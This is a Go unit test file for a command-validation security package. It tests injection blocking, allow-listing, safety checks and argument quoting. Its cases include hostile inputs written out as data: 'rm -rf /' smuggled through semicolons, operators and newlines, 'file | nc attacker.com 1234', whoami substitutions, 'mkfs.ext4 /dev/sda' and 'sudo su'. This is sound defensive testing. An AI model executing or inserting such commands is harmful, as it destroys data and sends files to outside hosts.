package security

import (
	"testing"
)

// TestCommandValidation tests command validation
func TestCommandValidation(t *testing.T) {
	cmdValidator := NewCommand()

	tests := []struct {
		name      string
		command   string
		args      []string
		shouldErr bool
		reason    string
	}{
		{
			name:      "safe command",
			command:   "ls",
			args:      []string{"-la"},
			shouldErr: false,
			reason:    "safe command should be allowed",
		},
		{
			name:      "command with semicolon injection",
			command:   "ls",
			args:      []string{"; rm -rf /"},
			shouldErr: true,
			reason:    "command injection with semicolon should be blocked",
		},
		{
			name:      "command with pipe injection",
			command:   "cat",
			args:      []string{"file | nc attacker.com 1234"},
			shouldErr: true,
			reason:    "command injection with pipe should be blocked",
		},
		{
			name:      "command with backtick injection",
			command:   "echo",
			args:      []string{"`whoami`"},
			shouldErr: true,
			reason:    "command injection with backticks should be blocked",
		},
		{
			name:      "command with $() injection",
			command:   "echo",
			args:      []string{"$(whoami)"},
			shouldErr: true,
			reason:    "command injection with $() should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := cmdValidator.ValidateCommand(tt.command, tt.args)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for %q, but got none: %s", tt.command, tt.reason)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("unexpected error for %q: %v (%s)", tt.command, err, tt.reason)
			}
		})
	}
}

// TestStrictCommandValidator tests strict command validator (whitelist mode)
func TestStrictCommandValidator(t *testing.T) {
	validator := NewStrictCommand()

	tests := []struct {
		name      string
		command   string
		args      []string
		shouldErr bool
	}{
		{
			name:      "allowed command - ls",
			command:   "ls",
			args:      []string{"-la"},
			shouldErr: false,
		},
		{
			name:      "allowed command - git status",
			command:   "git",
			args:      []string{"status"},
			shouldErr: false,
		},
		{
			name:      "disallowed command - rm",
			command:   "rm",
			args:      []string{"-rf", "/"},
			shouldErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateCommand(tt.command, tt.args)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for %q", tt.command)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("unexpected error for %q: %v", tt.command, err)
			}
		})
	}
}

// TestIsCommandSafe tests the quick command safety check
func TestIsCommandSafe(t *testing.T) {
	tests := []struct {
		command string
		safe    bool
	}{
		{"ls -la", true},
		{"rm -rf /", false},
		{"mkfs.ext4 /dev/sda", false},
		{"sudo su", false},
		{"echo hello", true},
	}

	for _, tt := range tests {
		result := IsCommandSafe(tt.command)
		if result != tt.safe {
			t.Errorf("IsCommandSafe(%q) = %v, want %v", tt.command, result, tt.safe)
		}
	}
}

// TestQuoteCommandArgs tests command argument quoting
func TestQuoteCommandArgs(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected []string
	}{
		{
			name:     "safe args",
			args:     []string{"file.txt", "output.txt"},
			expected: []string{"file.txt", "output.txt"},
		},
		{
			name:     "args with semicolon",
			args:     []string{"file;rm -rf /"},
			expected: []string{"'file;rm -rf /'"},
		},
		{
			name:     "args with pipe",
			args:     []string{"file|nc attacker.com"},
			expected: []string{"'file|nc attacker.com'"},
		},
		{
			name:     "empty arg",
			args:     []string{"", "file.txt"},
			expected: []string{"file.txt"},
		},
		{
			name:     "args with ampersand",
			args:     []string{"file&&evil"},
			expected: []string{"'file&&evil'"},
		},
		{
			name:     "args with backticks",
			args:     []string{"file`whoami`"},
			expected: []string{"'file`whoami`'"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := QuoteCommandArgs(tt.args)
			if len(result) != len(tt.expected) {
				t.Errorf("expected %d args, got %d", len(tt.expected), len(result))
				return
			}
			for i := range result {
				if result[i] != tt.expected[i] {
					t.Errorf("arg[%d] = %q, want %q", i, result[i], tt.expected[i])
				}
			}
		})
	}
}

// TestCommandValidationEdgeCases tests edge cases in command validation
func TestCommandValidationEdgeCases(t *testing.T) {
	cmdValidator := NewCommand()

	tests := []struct {
		name      string
		command   string
		args      []string
		shouldErr bool
	}{
		{
			name:      "command with && operator",
			command:   "ls",
			args:      []string{"-la", "&&", "rm", "-rf", "/"},
			shouldErr: true,
		},
		{
			name:      "command with || operator",
			command:   "test",
			args:      []string{"-f", "file", "||", "rm", "-rf", "/"},
			shouldErr: true,
		},
		{
			name:      "command with newline",
			command:   "echo",
			args:      []string{"hello\nrm -rf /"},
			shouldErr: true,
		},
		{
			name:      "safe args only",
			command:   "cat",
			args:      []string{"file.txt"},
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := cmdValidator.ValidateCommand(tt.command, tt.args)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for %q, but got none", tt.name)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("unexpected error for %q: %v", tt.name, err)
			}
		})
	}
}
